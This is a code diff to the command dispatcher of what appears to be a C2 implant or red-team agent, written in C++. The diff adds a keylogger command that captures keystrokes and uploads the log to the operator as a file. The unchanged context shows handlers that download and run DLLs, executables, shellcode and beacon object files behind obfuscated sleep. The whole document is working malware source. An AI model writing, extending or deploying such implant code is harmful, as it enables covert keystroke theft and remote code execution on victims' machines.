@@ -63,6 +63,7 @@ dispatch::process_command(
         {"runexe",      &dispatch::runexe},
         {"runshellcode",&dispatch::runshellcode},
         {"runbof",      &dispatch::runbof},
+        {"keylog",      &dispatch::keylog}
     };
 
     for(size_t i = 0; i < sizeof(commands) / sizeof(commands[0]); i++) {
@@ -182,7 +183,7 @@ dispatch::screenshot(const std::vector<std::string> &args, const implant_context
 command_output
 dispatch::rundll(const std::vector<std::string> &args, const implant_context &ctx) {
 
-    obfus::sleep(ctx.sleep_time);
+    obfus::sleep(ctx);
     std::string dll_file;
 
     if(!networking::http::recieve_file(
@@ -211,7 +212,7 @@ dispatch::rundll(const std::vector<std::string> &args, const implant_context &ct
 command_output
 dispatch::runexe(const std::vector<std::string> &args, const implant_context &ctx) {
 
-    obfus::sleep(ctx.sleep_time);
+    obfus::sleep(ctx);
     std::string exe_file;
 
     if(!networking::http::recieve_file(
@@ -240,7 +241,7 @@ dispatch::runexe(const std::vector<std::string> &args, const implant_context &ct
 command_output
 dispatch::runshellcode(const std::vector<std::string> &args, const implant_context &ctx) {
 
-    obfus::sleep(ctx.sleep_time);
+    obfus::sleep(ctx);
     std::string shellcode_buff;
 
     if(!networking::http::recieve_file(
@@ -279,7 +280,7 @@ dispatch::runshellcode(const std::vector<std::string> &args, const implant_conte
 
 command_output
 dispatch::runbof(const std::vector<std::string> &args, const implant_context &ctx) {
-    obfus::sleep(ctx.sleep_time);
+    obfus::sleep(ctx);
     std::string bof_buff;
 
     if(!networking::http::recieve_file(
@@ -298,5 +299,39 @@ dispatch::runbof(const std::vector<std::string> &args, const implant_context &ct
     }
 
     return { format_output(tasking::execute_bof(bof_buff, args.size() < 3 ? nullptr : args[2].c_str())), nullptr, output_type::PLAIN_TEXT };
+}
+
+
+command_output
+dispatch::keylog(const std::vector<std::string>& args, const implant_context& ctx) {
+
+    if(ctx.use_sleepmask) {
+        return { format_output("This command is not supported with sleepmask enabled."), nullptr, output_type::PLAIN_TEXT };
+    }
+
+    std::string buffer;
+
+    if(args[1] == "start") {
+        recon::keylog(recon::keylog_action::START, buffer);
+        return { format_output(buffer), nullptr, output_type::PLAIN_TEXT };
+    }
+    if(args[1] == "stop") {
+        recon::keylog(recon::keylog_action::STOP, buffer);
+        return { format_output(buffer), nullptr, output_type::PLAIN_TEXT };
+    }
+    if(args[1] == "get") {
+        if(!recon::keylog(recon::keylog_action::GET, buffer)) {
+            return { format_output(buffer), nullptr, output_type::PLAIN_TEXT };
+        }
+
+        HANDLE hfile = tasking::write_into_file(buffer, "bpmlog.txt", buffer.size(), true);
+        if(hfile == nullptr) {
+            return { format_output("Failed to upload log file."), nullptr, output_type::PLAIN_TEXT };
+        }
+
+        return {"", hfile, output_type::FILE};
+    }
+
+    return { format_output("Invalid action."), nullptr, output_type::PLAIN_TEXT };
 }
 
